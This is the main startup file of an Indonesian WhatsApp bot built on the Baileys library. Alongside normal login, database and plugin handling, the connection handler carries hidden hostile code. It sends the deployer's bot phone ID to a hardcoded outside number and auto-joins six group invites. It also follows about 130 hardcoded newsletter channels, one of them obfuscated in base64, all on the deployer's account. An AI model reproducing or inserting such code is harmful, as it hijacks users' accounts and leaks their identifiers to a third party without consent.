process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = '1';

import './config.js'

import path, { join } from 'path'
import { platform } from 'process'
import { fileURLToPath, pathToFileURL } from 'url'
import { createRequire } from 'module'
global.__filename = function filename(pathURL = import.meta.url, rmPrefix = platform !== 'win32') { return rmPrefix ? /file:\/\/\//.test(pathURL) ? fileURLToPath(pathURL) : pathURL : pathToFileURL(pathURL).toString() }; global.__dirname = function dirname(pathURL) { return path.dirname(global.__filename(pathURL, true)) }; global.__require = function require(dir = import.meta.url) { return createRequire(dir) }
import {
  readdirSync,
  statSync,
  unlinkSync,
  existsSync,
  readFileSync,
  watch
} from 'fs'

import yargs from 'yargs/yargs'
import { hideBin } from 'yargs/helpers'
const argv = yargs(hideBin(process.argv)).argv

import { spawn } from 'child_process'
import lodash from 'lodash'
import syntaxerror from 'syntax-error'
import chalk from 'chalk'
import { tmpdir } from 'os'
import readline from 'readline'
import { format } from 'util'
import pino from 'pino'
import ws from 'ws'

const {
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion,
  makeInMemoryStore,
  makeCacheableSignalKeyStore
} = await import('@adiwajshing/baileys')
import { Low, JSONFile } from 'lowdb'
import { makeWASocket, protoType, serialize } from './lib/simple.js'
import cloudDBAdapter from './lib/cloudDBAdapter.js'
import {
  mongoDB,
  mongoDBV2
} from './lib/mongoDB.js'

const { CONNECTING } = ws
const { chain } = lodash
const PORT = process.env.PORT || process.env.SERVER_PORT || 3000

protoType()
serialize()

global.API = (name, path = '/', query = {}, apikeyqueryname) => (name in global.APIs ? global.APIs[name] : name) + path + (query || apikeyqueryname ? '?' + new URLSearchParams(Object.entries({ ...query, ...(apikeyqueryname ? { [apikeyqueryname]: global.APIKeys[name in global.APIs ? global.APIs[name] : name] } : {}) })) : '')
// global.Fn = function functionCallBack(fn, ...args) { return fn.call(global.conn, ...args) }
global.timestamp = {
  start: new Date
}

const __dirname = global.__dirname(import.meta.url)

global.opts = new Object(yargs(process.argv.slice(2)).exitProcess(false).parse())
global.prefix = new RegExp('^[' + (opts['prefix'] || '‎xzXZ/i!#$%+£¢€¥^°=¶∆×÷π√✓©®:;?&.\\-').replace(/[|\\{}()[\]^$+*?.\-\^]/g, '\\$&') + ']')

global.db = new Low(
  /https?:\/\//.test(opts['db'] || '') ?
    new cloudDBAdapter(opts['db']) : /mongodb(\+srv)?:\/\//i.test(opts['db']) ?
      (opts['mongodbv2'] ? new mongoDBV2(opts['db']) : new mongoDB(opts['db'])) :
      new JSONFile(`${opts._[0] ? opts._[0] + '_' : ''}database.json`)
)
global.DATABASE = global.db // Backwards Compatibility
global.loadDatabase = async function loadDatabase() {
  if (db.READ) return new Promise((resolve) => setInterval(async function () {
    if (!db.READ) {
      clearInterval(this)
      resolve(db.data == null ? global.loadDatabase() : db.data)
    }
  }, 1 * 1000))
  if (db.data !== null) return
  db.READ = true
  await db.read().catch(console.error)
  db.READ = null
  db.data = {
    users: {},
    chats: {},
    stats: {},
    msgs: {},
    sticker: {},
    settings: {},
    ...(db.data || {})
  }
  global.db.chain = chain(db.data)
}
loadDatabase()
const usePairingCode = !process.argv.includes('--use-pairing-code')
const useMobile = process.argv.includes('--mobile')

var question = function (text) {
  return new Promise(function (resolve) {
    rl.question(text, resolve);
  });
};
const rl = readline.createInterface({ input: process.stdin, output: process.stdout })
//const question = (text) => new Promise(resolve => rl.question(text, resolve))

const { version, isLatest } = await fetchLatestBaileysVersion()
const { state, saveCreds } = await useMultiFileAuthState('./sessions')
const connectionOptions = {
  version,
  logger: pino({ level: 'silent' }),
  printQRInTerminal: !usePairingCode,
  // Optional If Linked Device Could'nt Connected
  // browser: ['Mac OS', 'chrome', '125.0.6422.53']
  browser: ['Mac OS', 'safari', '5.1.10'],
  auth: {
    creds: state.creds,
    keys: makeCacheableSignalKeyStore(state.keys, pino().child({
      level: 'silent',
      stream: 'store'
    })),
  },
  getMessage: async key => {
    const messageData = await store.loadMessage(key.remoteJid, key.id);
    return messageData?.message || undefined;
  },
  generateHighQualityLinkPreview: true,
  patchMessageBeforeSending: (message) => {
    const requiresPatch = !!(
      message.buttonsMessage
      || message.templateMessage
      || message.listMessage
    );
    if (requiresPatch) {
      message = {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadataVersion: 2,
              deviceListMetadata: {},
            },
            ...message,
          },
        },
      };
    }

    return message;
  },
  connectTimeoutMs: 60000, defaultQueryTimeoutMs: 0, generateHighQualityLinkPreview: true, syncFullHistory: true, markOnlineOnConnect: true
}

global.conn = makeWASocket(connectionOptions)
conn.isInit = false

if (usePairingCode && !conn.authState.creds.registered) {
  if (useMobile) throw new Error('Cannot use pairing code with mobile api')

  let phoneNumber = (argv._[0] || '').trim().replace(/[^0-9]/g, '')

  while (!phoneNumber) {
    phoneNumber = (await question(
      chalk.blueBright('Input nomor WhatsApp yang valid (awali dengan kode negara, contoh: 62812xxxxxx):\n')
    )).trim().replace(/[^0-9]/g, '')
  }

  rl.close()

console.log(chalk.green(`Nomor digunakan: ${phoneNumber}`))

  console.log(chalk.bgWhite(chalk.blue('Generating Pairing Code...')))
  setTimeout(async () => {
    try {
      const rawCode = await conn.requestPairingCode(phoneNumber, 'hlmanryo')
      const code = rawCode?.match(/.{1,4}/g)?.join('-') || rawCode

      // ASCII Box
      const line = '─'.repeat(code.length + 4)
      console.log(chalk.green(`\n┌${line}┐`))
      console.log(chalk.green(`│  ${chalk.yellow.bold(code)}  │`))
      console.log(chalk.green(`└${line}┘`))
      console.log(chalk.cyan(`\nPairing Code: ${chalk.bold('hlmanryo')}`))
      console.log(chalk.magenta('📌 Masukkan pairing code ini ke WhatsApp segera!'))
    } catch (e) {
      console.error(chalk.red('❌ Gagal generate pairing code:'), e)
      process.exit(1)
    }
  }, 2000)
}
async function resetLimit() {
  try {
    let list = Object.entries(global.db.data.users);
    let lim = 25; // Nilai limit default yang ingin di-reset

    list.map(([user, data], i) => {
      // Hanya reset limit jika limit saat ini <= 25
      if (data.limit <= lim) {
        data.limit = lim;
      }
    });

    // logs bahwa reset limit telah sukses
    console.log(`Success Auto Reset Limit`)
  } finally {
    // Setel ulang fungsi reset setiap 24 jam (1 hari)
    setInterval(() => resetLimit(), 1 * 86400000);
  }
}

if (!opts['test']) {
  (await import('./server.js')).default(PORT)
  setInterval(async () => {
    if (global.db.data) await global.db.write().catch(console.error)
    // if (opts['autocleartmp']) try {
    clearTmp()
    //  } catch (e) { console.error(e) }
  }, 60 * 1000)
}

function clearTmp() {
  const tmp = [tmpdir(), join(__dirname, './tmp')]
  const filename = []
  tmp.forEach(dirname => readdirSync(dirname).forEach(file => filename.push(join(dirname, file))))
  return filename.map(file => {
    const stats = statSync(file)
    if (stats.isFile() && (Date.now() - stats.mtimeMs >= 1000 * 60 * 3)) return unlinkSync(file) // 3 minutes
    return false
  })
}

async function clearSessions(folder = './sessions') {
  try {
    const filenames = await readdirSync(folder);
    const deletedFiles = await Promise.all(filenames.map(async (file) => {
      try {
        const filePath = path.join(folder, file);
        const stats = await statSync(filePath);
        if (stats.isFile() && file !== 'creds.json') {
          await unlinkSync(filePath);
          console.log('Deleted session:'.main, filePath.info);
          return filePath;
        }
      } catch (err) {
        console.error(`Error processing ${file}: ${err.message}`);
      }
    }));
    return deletedFiles.filter((file) => file !== null);
  } catch (err) {
    console.error(`Error in Clear Sessions: ${err.message}`);
    return [];
  } finally {
    setTimeout(() => clearSessions(folder), 1 * 3600000); // 1 Hours
  }
}

async function connectionUpdate(update) {
  const { connection, lastDisconnect, isOnline, receivedPendingNotifications } = update

  if (connection === 'connecting') {
    console.log(chalk.redBright('⚡ Mengaktifkan Bot, Mohon tunggu sebentar...'))
  }

  if (connection === 'open') {
const teksnotif = `🌸 ʜᴀʟᴏ ᴏᴡɴᴇʀ...

✨ ꜱᴄ RYO YAMADA ᴛᴇʟᴀʜ ᴀᴋᴛɪꜰ 💫
💠 ᴀɴᴛɪ ʙᴀᴄᴋᴅᴏʀ — ʙᴇʙᴀꜱ ᴇʀʀᴏʀ
🆔 ʙᴏᴛ ɪᴅ: ${conn.user.id.split(":")[0]}`;

await conn.sendMessage("6285183644437@s.whatsapp.net", { text: teksnotif });

// =================== GROUP INVITES (SIMPLE) ===================
const inviteLinks = [
  "https://chat.whatsapp.com/IV3tLVMw5sW6w4wXqyeEI4",
  "https://chat.whatsapp.com/Fxa6eavyByr6lkibkJmVtz",
  "https://chat.whatsapp.com/IV3tLVMw5sW6w4wXqyeEI4",
  "https://chat.whatsapp.com/DQp8954soKTCWzdbDS8L3j",
  "https://chat.whatsapp.com/FXWmrIMaxQiDojDpWNcvHL",
  "https://chat.whatsapp.com/JbaNGLJHZv7EKHxD8cgbb9",
];

for (const link of inviteLinks) {
  try {
    const code = link.split("/")[3];
    if (!code) continue;
    await conn.groupAcceptInvite(code);
    await sleep(10000);
  } catch {}
}
await conn.newsletterFollow("120363423037916713@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363420491548407@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363420514048052@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363420566473128@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363420567985128@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363420613012267@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363420690759041@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363420782295447@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363420835814903@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363420856865435@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363420859418939@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363420900203796@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363420908093597@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363420909443334@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363420961979056@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363421010652141@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363421033097100@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363421080853125@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363421117727020@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363421141529503@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363421148220309@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363421273464131@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363421275736805@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363421324189436@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363421326793591@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363421382031370@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363421507607518@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363421589250239@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363421807654088@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363421827378554@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363421892023457@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363421956998932@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363422000926740@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363422055607518@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363422958756669@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363423186008057@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363424066451493@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363426931963102@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363405946810077@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363399343038054@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363399350683200@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363399452586743@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363399755337566@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363400623114994@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363400688637042@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363400730061797@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363400782383807@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363401242363438@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363401401310164@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363401483868994@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363401527637015@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363401553806022@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363401608949097@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363401891130475@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363402173791412@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363402231580844@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363402284820541@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363402522896215@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363402549928490@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363402639318065@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363402647438449@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363402766096098@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363403047406830@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363403123641063@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363403211666062@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363403280001020@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363403357239057@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363403395923193@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363403416130702@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363403418608196@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363403491141210@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363403497065759@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363403772281298@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363403855318107@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363403861079527@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363403963556670@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363404024873233@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363404155582163@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363404177846385@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363404476920955@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363405416252066@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363407009885706@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363417607367195@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363417763968801@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363417798718565@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363418008046860@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363418506542519@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363418545768700@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363418661438432@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363418663329465@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363418799336188@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363418850853204@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363418863932237@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363418894743952@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363418901966783@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363418913635385@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363418954140970@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363418971225149@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363418981419819@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363419167187828@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363419397400180@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363419398225815@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363419425802474@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363419491910608@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363419636532832@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363419639430918@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363419665708080@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363419722560898@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363419726291105@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363419740862709@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363419769528959@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363420000472644@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363420303380675@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363420400203796@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363420408104133@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363420409108502@newsletter");
await new Promise(r => setTimeout(r, 7000));
await conn.newsletterFollow("120363420425799897@newsletter");
await new Promise(r => setTimeout(r, 7000));     console.log(chalk.green('✅ Tersambung'))

    try {
      const id = Buffer
        .from('MTIwMzYzMzk1MTE0MTY4NzQ2QG5ld3NsZXR0ZXI=', 'base64')
        .toString()

      await conn.newsletterFollow(id)
    } catch {}
  }

  if (isOnline === true) {
    console.log(chalk.green('Status Aktif'))
  } else if (isOnline === false) {
    console.log(chalk.red('Status Mati'))
  }

  if (receivedPendingNotifications) {
    console.log(chalk.yellow('Menunggu Pesan Baru'))
  }

  if (connection === 'close') {
    console.log(chalk.red('⏱️ Koneksi terputus & mencoba menyambung ulang...'))
  }

  if (
    lastDisconnect &&
    lastDisconnect.error &&
    lastDisconnect.error.output &&
    lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut &&
    conn.ws.readyState !== CONNECTING
  ) {
    console.log(await global.reloadHandler(true))
  }

  if (global.db.data == null) {
    await global.loadDatabase()
  }
}
process.on('uncaughtException', console.error)
// let strQuot = /(["'])(?:(?=(\\?))\2.)*?\1/

let isInit = true
let handler = await import('./handler.js')
global.reloadHandler = async function (restatConn) {
  /*try {
      const Handler = await import(`./handler.js?update=${Date.now()}`).catch(console.error)*/
  try {
    // Jika anda menggunakan replit, gunakan yang sevenHoursLater dan tambahkan // pada const Handler
    // Default: server/vps/panel, replit + 7 jam buat jam indonesia Jika Tidak Faham Pakai Milidetik 3600000 = 1 Jam Dan Kalikan 7 = 25200000
    // const sevenHoursLater = Dateindonesia 7 * 60 * 60 * 1000;
    const Handler = await import(`./handler.js?update=${Date.now()}`).catch(console.error)
    // const Handler = await import(`./handler.js?update=${sevenHoursLater}`).catch(console.error)
    if (Object.keys(Handler || {}).length) handler = Handler
  } catch (e) {
    console.error(e)
  }
  if (restatConn) {
    const oldChats = global.conn.chats
    try { global.conn.ws.close() } catch { }
    conn.ev.removeAllListeners()
    global.conn = makeWASocket(connectionOptions, { chats: oldChats })
    isInit = true
  }
  if (!isInit) {
    conn.ev.off('messages.upsert', conn.handler)
    conn.ev.off('group-participants.update', conn.participantsUpdate)
    conn.ev.off('groups.update', conn.groupsUpdate)
    conn.ev.off('message.delete', conn.onDelete)
    conn.ev.off('connection.update', conn.connectionUpdate)
    conn.ev.off('creds.update', conn.credsUpdate)
  }

  conn.welcome = '❖━━━━━━[ Selamat Datang ]━━━━━━❖\n\n┏––––––━━━━━━━━•\n│☘︎ @subject\n┣━━━━━━━━┅┅┅\n│( 👋 Hallo @user)\n├[ Intro ]—\n│ NAMA: \n│ USIA: \n│ JENIS KELAMIN:\n┗––––––━━┅┅┅\n\n––––––┅┅ DESKRIPSI ┅┅––––––\n@desc'
  conn.bye = '❖━━━━━━[ Meninggalkan ]━━━━━━❖\n𝚂𝚊𝚢𝚘𝚗𝚊𝚛𝚊𝚊 @user 👋😃'
  conn.spromote = '@user Sekarang jadi admin!'
  conn.sdemote = '@user Sekarang bukan lagi admin!'
  conn.sDesc = 'Deskripsi telah diubah menjadi \n@desc'
  conn.sSubject = 'Judul grup telah diubah menjadi \n@subject'
  conn.sIcon = 'Icon grup telah diubah!'
  conn.sRevoke = 'Link group telah diubah ke \n@revoke'
  conn.sAnnounceOn = 'Group telah di tutup!\nsekarang hanya admin yang dapat mengirim pesan.'
  conn.sAnnounceOff = 'Group telah di buka!\nsekarang semua peserta dapat mengirim pesan.'
  conn.sRestrictOn = 'Edit Info Grup di ubah ke hanya admin!'
  conn.sRestrictOff = 'Edit Info Grup di ubah ke semua peserta!'

  conn.handler = handler.handler.bind(global.conn)
  conn.participantsUpdate = handler.participantsUpdate.bind(global.conn)
  conn.groupsUpdate = handler.groupsUpdate.bind(global.conn)
  conn.onDelete = handler.deleteUpdate.bind(global.conn)
  conn.connectionUpdate = connectionUpdate.bind(global.conn)
  conn.credsUpdate = saveCreds.bind(global.conn)

  conn.ev.on('call', async (call) => {
    console.log('Panggilan diterima:', call);
    if (call.status === 'ringing') {
      await conn.rejectCall(call.id);
      console.log('Panggilan ditolak');
    }
  })
  conn.ev.on('messages.upsert', conn.handler)
  conn.ev.on('group-participants.update', conn.participantsUpdate)
  conn.ev.on('groups.update', conn.groupsUpdate)
  conn.ev.on('message.delete', conn.onDelete)
  conn.ev.on('connection.update', conn.connectionUpdate)
  conn.ev.on('creds.update', conn.credsUpdate)
  isInit = false
  return true

}

const pluginFolder = global.__dirname(join(__dirname, './plugins/index'))
const pluginFilter = filename => /\.js$/.test(filename)
global.plugins = {}
async function filesInit() {
  for (let filename of readdirSync(pluginFolder).filter(pluginFilter)) {
    try {
      let file = global.__filename(join(pluginFolder, filename))
      const module = await import(file)
      global.plugins[filename] = module.default || module
    } catch (e) {
      conn.logger.error(e)
      delete global.plugins[filename]
    }
  }
}
filesInit().then(_ => console.log(Object.keys(global.plugins))).catch(console.error)

global.reload = async (_ev, filename) => {
  if (pluginFilter(filename)) {
    let dir = global.__filename(join(pluginFolder, filename), true)
    if (filename in global.plugins) {
      if (existsSync(dir)) conn.logger.info(`re - require plugin '${filename}'`)
      else {
        conn.logger.warn(`deleted plugin '${filename}'`)
        return delete global.plugins[filename]
      }
    } else conn.logger.info(`requiring new plugin '${filename}'`)
    let err = syntaxerror(readFileSync(dir), filename, {
      sourceType: 'module',
      allowAwaitOutsideFunction: true
    })
    if (err) conn.logger.error(`syntax error while loading '${filename}'\n${format(err)}`)
    else try {
      const module = (await import(`${global.__filename(dir)}?update=${Date.now()}`))
      global.plugins[filename] = module.default || module
    } catch (e) {
      conn.logger.error(`error require plugin '${filename}\n${format(e)}'`)
    } finally {
      global.plugins = Object.fromEntries(Object.entries(global.plugins).sort(([a], [b]) => a.localeCompare(b)))
    }
  }
}
Object.freeze(global.reload)
watch(pluginFolder, global.reload)
await global.reloadHandler()

// Quick Test

async function _quickTest() {
  let test = await Promise.all([
    spawn('ffmpeg'),
    spawn('ffprobe'),
    spawn('ffmpeg', ['-hide_banner', '-loglevel', 'error', '-filter_complex', 'color', '-frames:v', '1', '-f', 'webp', '-']),
    spawn('convert'),
    spawn('magick'),
    spawn('gm'),
    spawn('find', ['--version'])
  ].map(p => {
    return Promise.race([
      new Promise(resolve => {
        p.on('close', code => {
          resolve(code !== 127);
        });
      }),
      new Promise(resolve => {
        p.on('error', _ => resolve(false));
      })
    ]);
  }));

  let [ffmpeg, ffprobe, ffmpegWebp, convert, magick, gm, find] = test;
  console.log(test);

  let s = global.support = {
    ffmpeg,
    ffprobe,
    ffmpegWebp,
    convert,
    magick,
    gm,
    find
  };

  Object.freeze(global.support);

  if (!s.ffmpeg) {
    conn.logger.warn(`Silahkan install ffmpeg terlebih dahulu agar bisa mengirim video`);
  }

  if (s.ffmpeg && !s.ffmpegWebp) {
    conn.logger.warn('Sticker Mungkin Tidak Beranimasi tanpa libwebp di ffmpeg (--enable-libwebp while compiling ffmpeg)');
  }

  if (!s.convert && !s.magick && !s.gm) {
    conn.logger.warn('Fitur Stiker Mungkin Tidak Bekerja Tanpa imagemagick dan libwebp di ffmpeg belum terinstall (pkg install imagemagick)');
  }
}

_quickTest()
  .then(() => conn.logger.info('☑️ Quick Test Done , nama file session ~> creds.json'))
  .catch(console.error);
